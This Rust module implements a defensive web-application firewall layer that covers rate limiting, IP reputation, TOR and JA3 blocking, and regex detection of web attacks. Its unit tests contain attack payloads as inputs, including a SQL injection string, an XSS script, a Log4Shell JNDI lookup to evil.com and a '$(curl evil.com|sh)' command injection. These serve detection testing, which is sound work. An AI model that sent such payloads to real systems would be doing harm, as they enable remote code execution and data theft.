//! SENTINEL Edge Shield - Layer 1
//!
//! Provides edge-level protection:
//! - Adaptive rate limiting with sliding window
//! - IP reputation and threat intelligence
//! - DDoS detection and mitigation
//! - Geographic restrictions
//! - HTTP request fingerprinting
//! - GeoIP + ASN risk scoring

pub mod rate_limiter;
pub mod ip_intel;
pub mod ddos;
pub mod fingerprint;
pub mod ja3;
pub mod tor_loader;
pub mod crs_patterns;
pub mod crs_loader;
pub mod endpoint_limiter;
pub mod redis_rate_limiter;
pub mod user_fingerprint;
pub mod ja3_blocklist;
pub mod tls_known_patterns;
// 2026-06-07: instant-ban su pattern di attacco noti (PHPUnit RCE, PHP-CGI,
// Log4Shell, Spring4Shell, path traversal). Defense-in-depth oltre JA3/JA4.
pub mod known_attack_paths;

use sentinel_core::{Request, LayerRiskScore as RiskScore, RiskLevel, RiskFlag, SentinelError, EdgeConfig};
use std::sync::Arc;
use std::net::IpAddr;

pub use rate_limiter::{RateLimiter, RateLimitResult};
pub use ip_intel::{IpIntelligence, IpReputation, ThreatType, GeoIpResult, AsnResult};
pub use ddos::{DDoSDetector, DDoSPattern};
pub use fingerprint::{fingerprint_request, RequestFingerprint, FingerprintClass, FingerprintSignals, HttpVersionSignal};
pub use ja3::{analyze_ja3, Ja3Result, Ja3Classification};
pub use crs_patterns::{scan_request as crs_scan, PatternMatch, AttackCategory, category_severity};
pub use endpoint_limiter::{EndpointLimiter, EndpointPolicy, LimitDecision, GLOBAL_ENDPOINT_LIMITER};

/// Edge Shield - First line of defense
pub struct EdgeShield {
    config: EdgeConfig,
    rate_limiter: Arc<RateLimiter>,
    ip_intel: Arc<IpIntelligence>,
    ddos_detector: Arc<DDoSDetector>,
}

impl EdgeShield {
    /// Create a new Edge Shield with the given configuration.
    ///
    /// TOR exit list bootstrap + hot-reload watcher:
    ///   - Bootstrap legge /opt/zeliai/data/tor-exit-nodes.txt (override
    ///     via env TOR_EXIT_LIST_PATH). File missing → graceful degradation
    ///     (Sentinel funziona ma senza blocco TOR — log warn).
    ///   - Watcher background task (notify crate) monitora il file e
    ///     ricarica atomicamente quando il cron weekly update lo riscrive.
    ///   - Cache IP reputation invalidata su reload — nuove richieste TOR
    ///     vedono subito il match.
    pub fn new(config: EdgeConfig) -> Result<Self, SentinelError> {
        let ip_intel = Arc::new(IpIntelligence::new());

        // Bootstrap: load TOR exits da file (graceful on missing).
        if let Err(e) = tor_loader::load_initial(&ip_intel) {
            tracing::warn!(error = %e, "TOR exit list initial load failed — Sentinel runs without TOR detection");
        }
        // Hot-reload watcher: spawn background task notify+debounce.
        tor_loader::spawn_watcher(ip_intel.clone());

        // G2 (2026-06-02): CRS pattern bundle — load initial + spawn watcher
        crs_loader::load_initial();
        crs_loader::spawn_watcher();

        Ok(Self {
            rate_limiter: Arc::new(RateLimiter::new(
                config.rate_limit_window,
                config.default_rate_limit as u64,
            )),
            ip_intel,
            ddos_detector: Arc::new(DDoSDetector::new()),
            config,
        })
    }

    /// Analyze a request and return a risk score
    /// Target latency: < 1ms
    pub async fn analyze(&self, request: &Request) -> Result<RiskScore, SentinelError> {
        let mut score = RiskScore::default();
        let ip = request.client_ip;

        // 1. Check rate limit
        if self.config.rate_limiting_enabled {
            let rate_result = self.rate_limiter.check(ip).await;
            if rate_result.is_limited {
                score.add_flag(RiskFlag::HighVolume);
                score.edge_score += 0.8;
            } else if rate_result.usage_ratio > 0.7 {
                score.edge_score += rate_result.usage_ratio * 0.3;
            }
        }

        // 2. Check IP reputation (includes GeoIP + ASN)
        if self.config.ip_reputation_enabled {
            let reputation = self.ip_intel.check(ip).await;
            match reputation.threat_type {
                Some(ThreatType::KnownAttacker) => {
                    score.add_flag(RiskFlag::KnownAttacker);
                    score.edge_score += 0.9;
                }
                Some(ThreatType::TorExitNode) => {
                    score.add_flag(RiskFlag::TorExit);
                    if self.config.block_tor {
                        // Score 1.0 → soglia block auto-superata dal decision
                        // engine downstream (sentinel-server). Senza 1.0 il
                        // valore 0.6 da solo NON triggerava block (era solo
                        // 'score contribution' tra altri segnali). Per il
                        // SaaS pubblico, TOR exit = block fisso (no rischio
                        // di false-positive: TOR users devono passare da VPN
                        // residenziale per accedere a tool legittimi).
                        score.edge_score += 1.0;
                    } else {
                        // block_tor=false → mode 'observe': flag MA non block.
                        // Utile per fase pilot pre-launch (raccogli stats
                        // TOR usage senza impatto UX).
                        score.edge_score += 0.2;
                    }
                }
                Some(ThreatType::Proxy) => {
                    if self.config.block_proxies {
                        score.add_flag(RiskFlag::Proxy);
                        score.edge_score += 0.5;
                    } else {
                        score.add_flag(RiskFlag::Proxy);
                        score.edge_score += 0.1;
                    }
                }
                Some(ThreatType::Scanner) => {
                    score.add_flag(RiskFlag::Scanner);
                    score.edge_score += 0.7;
                }
                Some(ThreatType::Botnet) => {
                    score.add_flag(RiskFlag::Botnet);
                    score.edge_score += 0.95;
                }
                None => {}
            }

            // Add reputation score
            score.edge_score += (1.0 - reputation.score) * 0.2;

            // GeoIP risk contribution (0-15 points → normalized to 0.0-0.15)
            let geo_risk = self.ip_intel.get_country_risk(ip);
            if geo_risk > 0 {
                score.edge_score += (geo_risk as f64) / 100.0;
            }

            // ASN/hosting risk contribution
            if reputation.is_hosting {
                score.add_flag(RiskFlag::Datacenter);
                score.edge_score += 0.1;
            }
        }

        // 2.7 F11 (2026-06-02): rate limiter per-endpoint (Layer 1.7).
        // Granulare per (method + path pattern). Hits oltre soglia →
        // edge_score += 0.85 (strong signal) + flag HighVolume.
        {
            let decision = endpoint_limiter::GLOBAL_ENDPOINT_LIMITER.check(
                request.client_ip,
                &request.method,
                &request.path,
            );
            if decision.limited {
                score.add_flag(RiskFlag::HighVolume);
                score.edge_score += 0.85;
                tracing::warn!(
                    ip = %request.client_ip,
                    method = %request.method,
                    path = %request.path,
                    policy = decision.policy_label,
                    count = decision.current_count,
                    max = decision.max_requests,
                    retry_after = decision.retry_after_secs,
                    "F11: endpoint rate limit exceeded"
                );
            }
        }

        // 2.6 P2 (2026-06-02): JA3 blocklist — TLS impersonation tool detection.
        // Richiede nginx-ssl-ja3 modulo installato (scripts/install-nginx-ssl-ja3.sh).
        // Senza, header X-JA3-Hash assente → skip silenzioso.
        if let Some(ja3_hash) = request.headers.get("x-ja3-hash") {
            if let Some(ja3_match) = ja3_blocklist::check_ja3(ja3_hash) {
                score.edge_score += ja3_match.severity;
                score.add_flag(RiskFlag::Ja3Scanner);
                tracing::warn!(
                    ip = %ip,
                    ja3_hash = %ja3_match.hash,
                    ja3_label = %ja3_match.label,
                    severity = ja3_match.severity,
                    "P2: JA3 blocklist match — TLS impersonation tool detected"
                );
            }
        }

        // 2.5 F10 (2026-06-02): OWASP CRS-like pattern engine (Layer 1.5).
        // 52 regole regex su path + headers + body. First-match wins.
        // Severity >= 0.85 → escape hatch in sentinel-core forza ban.
        let body_str: Option<String> = match &request.body {
            Some(sentinel_core::RequestBody::Text(t)) => Some(t.clone()),
            Some(sentinel_core::RequestBody::Json(v)) => Some(v.to_string()),
            Some(sentinel_core::RequestBody::Binary(_)) | None => None,
        };
        if let Some(pattern_match) = crs_patterns::scan_request(
            &request.path,
            &request.headers,
            body_str.as_deref(),
        ) {
            let severity = crs_patterns::category_severity(pattern_match.category);
            score.edge_score += severity;
            score.add_flag(match pattern_match.category {
                AttackCategory::SqlInjection => RiskFlag::WebSqlInjection,
                AttackCategory::NoSqlInjection => RiskFlag::WebNoSqlInjection,
                AttackCategory::XssReflected | AttackCategory::XssStored => RiskFlag::WebXss,
                AttackCategory::PathTraversal | AttackCategory::LocalFileInclusion
                | AttackCategory::RemoteFileInclusion => RiskFlag::WebPathTraversal,
                AttackCategory::Log4Shell => RiskFlag::WebLog4Shell,
                AttackCategory::Spring4Shell => RiskFlag::WebLog4Shell, // closest enum match for CVE pattern
                AttackCategory::Http2RapidReset => RiskFlag::WebHttpSmuggling, // closest match: protocol-level abuse
                AttackCategory::WebSocketAbuse => RiskFlag::WebWebsocketAttack,
                AttackCategory::GraphqlDepthAbuse => RiskFlag::WebGraphqlAttack,
                AttackCategory::DnsRebinding => RiskFlag::WebDnsRebinding,
                AttackCategory::CommandInjection => RiskFlag::WebCommandInjection,
                AttackCategory::Ssrf => RiskFlag::WebSsrf,
                AttackCategory::XmlExternalEntity => RiskFlag::WebXxe,
                AttackCategory::TemplateInjection | AttackCategory::OgnlInjection => RiskFlag::WebSsti,
                AttackCategory::PrototypePollution => RiskFlag::WebPrototypePollution,
                AttackCategory::Deserialization => RiskFlag::WebHttpSmuggling, // no dedicated deser flag
            });
            tracing::warn!(
                rule = pattern_match.category.rule_id(),
                surface = pattern_match.surface,
                severity = severity,
                ip = %ip,
                "F10: OWASP CRS pattern match — request will be blocked"
            );
        }

        // 3. HTTP fingerprinting
        let fp = fingerprint_request(&request.headers);
        match fp.classification {
            FingerprintClass::Scanner => {
                score.add_flag(RiskFlag::Scanner);
                score.edge_score += 0.15;
            }
            FingerprintClass::Unknown => {
                score.edge_score += 0.10;
            }
            FingerprintClass::Automation => {
                score.edge_score += 0.05;
            }
            FingerprintClass::Browser | FingerprintClass::VerifiedBot => {
                // No additional risk
            }
        }

        // 4. Check for DDoS patterns
        if let Some(pattern) = self.ddos_detector.check(ip, request).await {
            match pattern {
                DDoSPattern::Volumetric => {
                    score.add_flag(RiskFlag::HighVolume);
                    score.edge_score += 0.85;
                }
                DDoSPattern::SlowLoris => {
                    score.add_flag(RiskFlag::TimingAnomaly);
                    score.edge_score += 0.75;
                }
                DDoSPattern::ApplicationLayer => {
                    score.add_flag(RiskFlag::AnomalousPattern);
                    score.edge_score += 0.8;
                }
            }
        }

        // Normalize score
        score.edge_score = score.edge_score.min(1.0);

        // Set risk level based on edge score
        score.level = if score.edge_score >= 0.8 {
            RiskLevel::Critical
        } else if score.edge_score >= 0.6 {
            RiskLevel::High
        } else if score.edge_score >= 0.4 {
            RiskLevel::Medium
        } else if score.edge_score >= 0.2 {
            RiskLevel::Low
        } else {
            RiskLevel::None
        };

        Ok(score)
    }

    /// Get the last fingerprint result for an IP (via ip_intel)
    pub fn ip_intel(&self) -> &IpIntelligence {
        &self.ip_intel
    }

    /// Block an IP address
    pub async fn block_ip(&self, ip: IpAddr, reason: &str, duration_secs: u64) {
        self.ip_intel.block(ip, reason, duration_secs).await;
    }

    /// Unblock an IP address
    pub async fn unblock_ip(&self, ip: IpAddr) {
        self.ip_intel.unblock(ip).await;
    }

    /// Get current rate limit status for an IP
    pub async fn get_rate_limit_status(&self, ip: IpAddr) -> RateLimitResult {
        self.rate_limiter.check(ip).await
    }

    /// Get DDoS detector for defense mode integration
    pub fn ddos_detector(&self) -> &DDoSDetector {
        &self.ddos_detector
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;

    #[tokio::test]
    async fn test_edge_shield_creation() {
        let config = EdgeConfig::default();
        let shield = EdgeShield::new(config).unwrap();
        assert!(Arc::strong_count(&shield.rate_limiter) == 1);
    }

    #[tokio::test]
    async fn test_clean_request() {
        let config = EdgeConfig::default();
        let shield = EdgeShield::new(config).unwrap();

        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)),
            ..Default::default()
        };

        let score = shield.analyze(&request).await.unwrap();
        assert!(score.edge_score < 0.3); // Slightly higher due to fingerprint unknown
    }

    // ── F10 (2026-06-02): CRS pattern wiring integration tests ────────

    fn shield_with_defaults() -> EdgeShield {
        EdgeShield::new(EdgeConfig::default()).unwrap()
    }

    #[tokio::test]
    async fn f10_sql_injection_in_path_pushes_edge_score_above_strong() {
        let shield = shield_with_defaults();
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 10)),
            method: "GET".to_string(),
            path: "/users?id=1 UNION SELECT password FROM users".to_string(),
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        // CRS SqlInjection severity 0.92 → edge_score deve essere >= 0.85
        assert!(
            score.edge_score >= 0.85,
            "CRS sqli match deve forzare strong signal, got edge_score={}",
            score.edge_score
        );
        assert!(
            score.flags.iter().any(|f| matches!(f, RiskFlag::WebSqlInjection)),
            "deve includere flag WebSqlInjection, got: {:?}",
            score.flags
        );
    }

    #[tokio::test]
    async fn f10_xss_in_path_emits_webxss_flag() {
        let shield = shield_with_defaults();
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 11)),
            method: "GET".to_string(),
            path: "/search?q=<script>alert(1)</script>".to_string(),
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        assert!(score.flags.iter().any(|f| matches!(f, RiskFlag::WebXss)));
        assert!(score.edge_score >= 0.85);
    }

    #[tokio::test]
    async fn f10_log4shell_in_user_agent_critical_99() {
        let shield = shield_with_defaults();
        let mut headers = std::collections::HashMap::new();
        headers.insert("user-agent".to_string(), "${jndi:ldap://evil.com/x}".to_string());
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 12)),
            method: "GET".to_string(),
            path: "/".to_string(),
            headers,
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        // Log4Shell severity 0.99 → edge_score >= 0.99
        assert!(
            score.edge_score >= 0.99,
            "Log4Shell DEVE essere critical 0.99+, got {}",
            score.edge_score
        );
        assert!(score.flags.iter().any(|f| matches!(f, RiskFlag::WebLog4Shell)));
    }

    #[tokio::test]
    async fn f10_command_injection_in_body_flagged() {
        let shield = shield_with_defaults();
        let body = sentinel_core::RequestBody::Text(
            r#"{"cmd":"$(curl evil.com|sh)"}"#.to_string(),
        );
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 13)),
            method: "POST".to_string(),
            path: "/api/v1/run".to_string(),
            body: Some(body),
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        assert!(score.flags.iter().any(|f| matches!(f, RiskFlag::WebCommandInjection)));
    }

    #[tokio::test]
    async fn f10_no_false_positive_on_clean_url() {
        let shield = shield_with_defaults();
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 14)),
            method: "GET".to_string(),
            path: "/api/v1/workspaces?page=1&limit=20".to_string(),
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        // Niente flag CRS, edge_score molto basso
        assert!(
            !score.flags.iter().any(|f| matches!(
                f,
                RiskFlag::WebSqlInjection
                    | RiskFlag::WebXss
                    | RiskFlag::WebCommandInjection
                    | RiskFlag::WebLog4Shell
                    | RiskFlag::WebSsrf
                    | RiskFlag::WebPathTraversal
            )),
            "URL puliti NON devono triggerare CRS flag"
        );
    }

    // ── F11 (2026-06-02): endpoint rate limiter wiring tests ──────────

    #[tokio::test]
    async fn f11_login_burst_triggers_strong_signal_after_5_hits() {
        let shield = shield_with_defaults();
        let ip = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 20));
        let make_req = || Request {
            client_ip: ip,
            method: "POST".to_string(),
            path: "/login".to_string(),
            ..Default::default()
        };
        // 5 hit consentiti, 6esimo deve triggerare HighVolume
        for _ in 0..5 {
            let _ = shield.analyze(&make_req()).await.unwrap();
        }
        let score = shield.analyze(&make_req()).await.unwrap();
        assert!(
            score.flags.iter().any(|f| matches!(f, RiskFlag::HighVolume)),
            "6esimo POST /login deve avere HighVolume flag, got: {:?}",
            score.flags
        );
    }

    #[tokio::test]
    async fn f11_signup_burst_at_4_triggers_limit() {
        let shield = shield_with_defaults();
        let ip = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 21));
        let make_req = || Request {
            client_ip: ip,
            method: "POST".to_string(),
            path: "/signup".to_string(),
            ..Default::default()
        };
        // Soglia 3 → 4esimo viene limitato
        for _ in 0..3 {
            let _ = shield.analyze(&make_req()).await.unwrap();
        }
        let score = shield.analyze(&make_req()).await.unwrap();
        assert!(score.flags.iter().any(|f| matches!(f, RiskFlag::HighVolume)));
    }

    #[tokio::test]
    async fn f11_browsing_under_default_threshold_no_limit() {
        // NB: il legacy rate_limiter di EdgeConfig ha default 60 req/min globale.
        // Quindi qui restiamo BEN sotto (40) per testare solo F11 browsing-default 600/min.
        let shield = shield_with_defaults();
        let ip = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 22));
        for _ in 0..40 {
            let req = Request {
                client_ip: ip,
                method: "GET".to_string(),
                path: "/".to_string(),
                ..Default::default()
            };
            let score = shield.analyze(&req).await.unwrap();
            assert!(
                !score.flags.iter().any(|f| matches!(f, RiskFlag::HighVolume)),
                "browsing 40 hit entro 600/min (e 60/min legacy) NON deve essere HighVolume"
            );
        }
    }

    #[tokio::test]
    async fn f11_browsing_default_600_per_minute_is_well_above_legacy_60() {
        // Test di documentazione: verifica che la default policy F11 per `/*`
        // sia >= della soglia legacy (60), così le browse normali sono ammesse.
        let limiter = endpoint_limiter::EndpointLimiter::with_defaults();
        let p = limiter.match_policy("GET", "/some-page").expect("must match /*");
        assert!(p.max_requests > 60,
                "browsing-default deve superare la soglia legacy 60/min");
        assert_eq!(p.label, "browsing-default");
    }

    #[tokio::test]
    async fn f11_per_ip_isolation_login() {
        let shield = shield_with_defaults();
        let ip_attacker = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 30));
        let ip_legit = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 31));
        let mk = |ip: IpAddr| Request {
            client_ip: ip,
            method: "POST".to_string(),
            path: "/login".to_string(),
            ..Default::default()
        };
        // Attacker fa 6 hit (limit trigger)
        for _ in 0..6 {
            let _ = shield.analyze(&mk(ip_attacker)).await.unwrap();
        }
        // Legit prima volta: NON deve essere flag (counter separato per IP)
        let score = shield.analyze(&mk(ip_legit)).await.unwrap();
        assert!(
            !score.flags.iter().any(|f| matches!(f, RiskFlag::HighVolume)),
            "ip_legit primo hit non deve ereditare lo stato di ip_attacker"
        );
    }

    // ── P2 JA3 wiring integration tests ──────────────────────────────

    #[tokio::test]
    async fn p2_ja3_blocked_hash_in_header_pushes_edge_score() {
        let shield = shield_with_defaults();
        let mut headers = std::collections::HashMap::new();
        // curl-impersonate chrome104 hash noto
        headers.insert("x-ja3-hash".to_string(), "b32309a26951912be7dba376398abc3b".to_string());
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 50)),
            method: "GET".to_string(),
            path: "/".to_string(),
            headers,
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        // JA3 severity 0.95 → edge_score >= 0.85 → strong signal
        assert!(score.edge_score >= 0.85, "JA3 match deve forzare strong, got {}", score.edge_score);
        assert!(score.flags.iter().any(|f| matches!(f, RiskFlag::Ja3Scanner)));
    }

    #[tokio::test]
    async fn p2_ja3_unknown_hash_no_effect() {
        let shield = shield_with_defaults();
        let mut headers = std::collections::HashMap::new();
        // Random hash (non in blocklist) — Chrome browser legit potrebbe avere uno simile
        headers.insert("x-ja3-hash".to_string(), "0123456789abcdef0123456789abcdef".to_string());
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 51)),
            method: "GET".to_string(),
            path: "/".to_string(),
            headers,
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        assert!(!score.flags.iter().any(|f| matches!(f, RiskFlag::Ja3Scanner)));
    }

    #[tokio::test]
    async fn p2_no_ja3_header_no_effect() {
        let shield = shield_with_defaults();
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 52)),
            method: "GET".to_string(),
            path: "/".to_string(),
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        // Senza X-JA3-Hash (nginx-ja3 non installato), nessun match
        assert!(!score.flags.iter().any(|f| matches!(f, RiskFlag::Ja3Scanner)));
    }

    #[tokio::test]
    async fn f10_f11_combined_sqli_under_rate_limit_still_caught_by_crs() {
        // Anche se non triggera RL, CRS deve catturare SQLi sulla prima richiesta
        let shield = shield_with_defaults();
        let request = Request {
            client_ip: IpAddr::V4(Ipv4Addr::new(203, 0, 113, 40)),
            method: "GET".to_string(),
            path: "/x?id=1 OR 1=1".to_string(),
            ..Default::default()
        };
        let score = shield.analyze(&request).await.unwrap();
        // Singolo hit, no rate-limit → ma CRS deve scattare
        assert!(score.flags.iter().any(|f| matches!(f, RiskFlag::WebSqlInjection)));
        assert!(score.edge_score >= 0.85, "CRS deve dominare anche senza RL");
    }
}
